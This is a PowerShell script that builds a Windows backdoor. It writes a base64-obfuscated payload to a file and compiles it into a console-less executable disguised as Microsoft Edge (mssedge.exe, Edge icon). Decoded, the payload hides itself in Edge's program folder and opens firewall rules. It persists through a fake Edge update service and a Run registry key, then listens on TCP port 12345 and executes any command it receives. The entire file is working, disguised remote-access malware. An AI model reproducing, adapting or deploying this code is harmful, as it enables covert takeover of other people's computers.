# Parameters for the local endpoint the beacon is using
param($HomeAddr, $HomePort, $ShellName)
try{
    # Create script
    $file = '$str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICMgU2NyaXB0IA0KcGFyYW0oW3N3aXRjaF0kUnVuLCBbc3dpdGNoXSRlbGV2YXRlZCkNCg0KIyBGb3JjZSBhZG1pbiBodHRwczovL3N1cGVydXNlci5jb20vcXVlc3Rpb25zLzEwODIwNy9ob3ctdG8tcnVuLWEtcG93ZXJzaGVsbC1zY3JpcHQtYXMtYWRtaW5pc3RyYXRvcg0KIyBOb3Qgc28gdXNlZnVsIHdpdGggbmV3IHBzMmV4ZSBhcmdzDQojIGZ1bmN0aW9uIFRlc3QtQWRtaW4gew0KIyAgICAgJGN1cnJlbnRVc2VyID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCAkKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KIyAgICAgJGN1cnJlbnRVc2VyLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0aW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiMgfQ0KDQojIGlmICgoVGVzdC1BZG1pbikgLWVxICRmYWxzZSkgIHsNCiMgICAgIGlmICgkZWxldmF0ZWQpIHsNCiMgICAgICAgICAjIHRyaWVkIHRvIGVsZXZhdGUsIGRpZCBub3Qgd29yaywgYWJvcnRpbmcNCiMgICAgIH0gZWxzZSB7DQojICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgaGlkZGVuIC1WZXJiIFJ1bkFzIC1Bcmd1bWVudExpc3QgKCctbm9wcm9maWxlIC1maWxlICJ7MH0iIC1lbGV2YXRlZCcgLWYgKCIkbG9jXG1zc2VkZ2UuZXhlIikpDQojICAgICB9DQojICAgICBleGl0DQojIH0NCg0KIyBIaWRlIGlmIG5vdCBoaWRkZW4NCiRsb2MgPSBHZXQtTG9jYXRpb24NCmlmKCRsb2MgLW5lICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1pY3Jvc29mdFxFZGdlXEFwcGxpY2F0aW9uXCIgKXsNCiAgICBDb3B5LUl0ZW0gLXBhdGggIiRsb2NcbXNzZWRnZS5leGUiIC1kZXN0aW5hdGlvbiAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblwiDQogICAgTmV3LU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheU5hbWUgIk1pY3Jvc29mdCBFZGdlIiAtRGlyZWN0aW9uIEluYm91bmQgLUFjdGlvbiBBbGxvdyAtUHJvZ3JhbSAiJGxvY1xtc3NlZGdlLmV4ZSINCiAgICBOZXctTmV0RmlyZXdhbGxSdWxlIC1EaXNwbGF5TmFtZSAiTWljcm9zb2Z0IEVkZ2UiIC1EaXJlY3Rpb24gSW5ib3VuZCAtQWN0aW9uIEFsbG93IC1Qcm9ncmFtICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1pY3Jvc29mdFxFZGdlXEFwcGxpY2F0aW9uXG1zc2VkZ2UuZXhlIg0KfQ0KDQojIE1ha2Ugc2VydmljZQ0KaWYoIShHZXQtU2VydmljZSB8ID8gTmFtZSAtZXEgIk1pY3Jvc29mdEVkZ2VVcGRhdGVyIikpew0KICAgIE5ldy1TZXJ2aWNlIC1OYW1lICJNaWNyb3NvZnRFZGdlVXBkYXRlciIgLURpc3BsYXlOYW1lICJNaWNyb3NvZnQgRWRnZSBVcGRhdGUgU2VydmljZSIgLUJpbmFyeVBhdGhOYW1lICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1pY3Jvc29mdFxFZGdlXEFwcGxpY2F0aW9uXG1zc2VkZ2UuZXhlIC1SdW4iIC1TdGFydHVwVHlwZSAiQXV0b21hdGljIiAtRGVzY3JpcHRpb24gIk1pY3Jvc29mdCBFZGdlIHVwZGF0ZSBzZXJ2aWNlIg0KfQ0KDQojIE1ha2UgcmVnaXN0cnkgZW50cnkgDQppZighKFRlc3QtUGF0aCBIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cbXNzZWRnZSkpew0KICAgIE5ldy1JdGVtIC1QYXRoIEhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAtTmFtZSBtc3NlZGdlIC1Gb3JjZQ0KICAgIFNldC1JdGVtIC1QYXRoIEhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blxtc3NlZGdlIC1WYWx1ZSAnIk1pY3Jvc29mdCBFZGdlIj0iQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblxtc3NlZGdlLmV4ZSAtUnVuIicNCn0NCg0KIyBTd2l0Y2ggYXQgc29tZSBwb2ludCB0byBnZW5lcmF0ZSBpbmZvIGR5bmFtaWNhbGx5DQppZigkSG9tZUFkZHIgLWVxICRudWxsIC1PciAkSG9tZVBvcnQgLWVxICRudWxsKXsNCiMgICAgIFdyaXRlLUhvc3QgIlNwZWNpZnkgaG9tZSBhZGRyZXNzIGFuZCBwb3J0Ig0KIyAgICAgV3JpdGUtSG9zdCAiSG9tZSBBZGRyZXNzOiAiIC1Ob05ld0xpbmUNCiMgICAgICRIb21lQWRkciA9IFJlYWQtSG9zdA0KIyAgICAgV3JpdGUtSG9zdCAiSG9tZSBQb3J0OiAiIC1Ob05ld0xpbmUNCiMgICAgICRIb21lUG9ydCA9IFJlYWQtSG9zdA0KIyBGb3IgcHJhY3RpY2FsIHB1cnBvc2VzLCBiaW5kIG9uIGFsbCBhZGRyZXNzZXMgDQojIElkZWFsbHksIHRoZSBwb3J0IHdvdWxkIGJlIGNob3NlbiBhdCBnZW5lcmF0aW9uLiBIb3dldmVyLCBJJ20ga2VlcGluZyBpdCAxMjM0NSBmb3IgdGVzdGluZy4gDQokSG9tZUFkZHIgPSAiMC4wLjAuMCINCiRIb21lUG9ydCA9IDEyMzQ1DQp9DQoNCiMgSURLLCBzZW5kIHRoaXMgYWZ0ZXIgc2VydmVyIGlzIGVzdGFibGlzaGVkIGlnDQojIE1vcmUgb24gdGhpcyBsYXRlcg0KJEhvbWVFeHQgPSAoaW52b2tlLXdlYnJlcXVlc3QgLXVyaSBpZmNvbmZpZy5tZSkuQ29udGVudA0KDQojIE5ldyBUQ1AgTGlzdGVuZXIgb2JqZWN0DQokU2VydmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXIoJEhvbWVBZGRyLCAkSG9tZVBvcnQpDQojIE5ldyBCdWZmZXIgb2JqZWN0IHRvIGhvbGQgdGhlIGNvbnZlcnRlZCBtZXNzYWdlcyBpbiBieXRlcw0KJEJ1ZmYgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNA0KIyBPYmplY3QgdG8gYXNjaWkgZW5jb2RlIHRoZSBtZXNzYWdlcw0KJEVuYyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KIyBTdGFydCB0aGUgc2VydmVyDQp0cnl7DQogICAgJFNlcnZlci5zdGFydCgpDQogICAgIyBTdGFydCBlZGdlIHRvIGhpZGUgdGhlIHByb2Nlc3MNCiAgICAjIGRvbid0IHN0YXJ0IGlmIHNjcmlwdCBpcyBydW5uaW5nIGF1dG9tYXRpY2FsbHkNCiAgICBpZigkUnVuIC1lcSAkRmFsc2Upew0KICAgICAgICBzdGFydC1wcm9jZXNzICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXE1pY3Jvc29mdCBFZGdlLmxuayINCiAgICB9DQogICAgIyBGb3JldmVyDQogICAgd2hpbGUgKCR0cnVlKXsNCiAgICAgICAgIyBBY2NlcHQgYSBjbGllbnQNCiAgICAgICAgJENsaWVudCA9ICRTZXJ2ZXIuQWNjZXB0VGNwQ2xpZW50KCkNCiAgICAgICAgIyBHZXQgdGhlIGNsaWVudCBtZXNzYWdlIHN0cmVhbQ0KICAgICAgICAkU3RyZWFtID0gJENsaWVudC5HZXRTdHJlYW0oKQ0KICAgICAgICAjIFdoaWxlIHRoZSBieXRlIHN0cmVhbSBpcyBub3QgMCAoZS5nLiwgc3RpbGwgaW5jb21pbmcpDQogICAgICAgIHdoaWxlICgoJGkgPSAkU3RyZWFtLlJlYWQoJEJ1ZmYsMCwkQnVmZi5MZW5ndGgpKSAtbmUgMCl7DQogICAgICAgICAgICAjIENvbnZlcnQgdGhlIGJ5dGVzIHRvIHN0cmluZw0KICAgICAgICAgICAgJFJlc3AgPSAkRW5jLkdldFN0cmluZygkQnVmZiwwLCRpKQ0KICAgICAgICAgICAgIyBRdWl0IG1lc3NhZ2UNCiAgICAgICAgICAgIHRyeXsNCiAgICAgICAgICAgICAgICAjIFJ1biB0aGUgcmVjaWV2ZWQgbWVzc2FnZSBhcyBhIGNvbW1hbmQNCiAgICAgICAgICAgICAgICAkQ29tbSA9IChJbnZva2UtRXhwcmVzc2lvbiAkUmVzcCB8IG91dC1TdHJpbmcpDQogICAgICAgICAgICAgICAgIyBFbmNvZGUgdGhlIGNvbW1hbmQgb3V0cHV0DQogICAgICAgICAgICAgICAgJERhdGEgPSAkRW5jLkdldEJ5dGVzKCRDb21tKQ0KICAgICAgICAgICAgICAgICRCbGFuayA9IE5ldy1PYmplY3QgYnl0ZVtdIDEwMjQNCiAgICAgICAgICAgICAgICAkRW5kID0gJEVuYy5HZXRCeXRlcygiRW5kTWVzc2FnZSIpDQogICAgICAgICAgICAgICAgIyBTZW5kIGl0IHRvIHRoZSBjbGllbnQNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCREYXRhLDAsJERhdGEuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCRFbmQsMCwkRW5kLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCRCbGFuaywwLCRCbGFuay5MZW5ndGgpDQogICAgICAgICAgICAgICAgfWNhdGNoew0KICAgICAgICAgICAgICAgICAgICAkRGF0YSA9ICRFbmMuR2V0Qnl0ZXMoJEVycm9yWzBdKQ0KICAgICAgICAgICAgICAgICAgICAkTmV3bCA9ICRFbmMuR2V0Qnl0ZXMoImBuIikNCiAgICAgICAgICAgICAgICAgICAgJEJsYW5rID0gTmV3LU9iamVjdCBieXRlW10gMTAyNA0KICAgICAgICAgICAgICAgICAgICAkRW5kID0gJEVuYy5HZXRCeXRlcygiRW5kTWVzc2FnZSIpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJERhdGEsMCwkRGF0YS5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJE5ld2wsMCwkTmV3bC5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgJFN0cmVhbS5Xcml0ZSgkRW5kLDAsJEVuZC5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkU3RyZWFtLkNsb3NlKCkNCiAgICB9DQp9Y2F0Y2h7DQogICAgaWYoJFJ1biAtZXEgJEZhbHNlKXsNCiAgICAgICAgc3RhcnQtcHJvY2VzcyAiQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xNaWNyb3NvZnQgRWRnZS5sbmsiDQogICAgfQ0KfQ0KDQo="))
    Invoke-Expression $str'
    Out-File -InputObject $file -FilePath "shell.ps1" 

    # Convert script to exe
    if(!$ShellName){
        $ShellName = "mssedge.exe"
    }
    $loc = Get-Location
    Invoke-ps2exe $loc\shell.ps1 -outputfile $ShellName -NoConsole -iconFile "edge.ico" -requireAdmin -noOutput -noError -noVisualStyles
}catch{
    write-host $Error[0]
<#        # Try to install ps2exe
    Install-PackageProvider NuGet -Force
    Set-PSRepository PSGallery -InstallationPolicy Trusted
    Install-Module ps2exe -Repository PSGallery
    GenerateBeacon#>
}


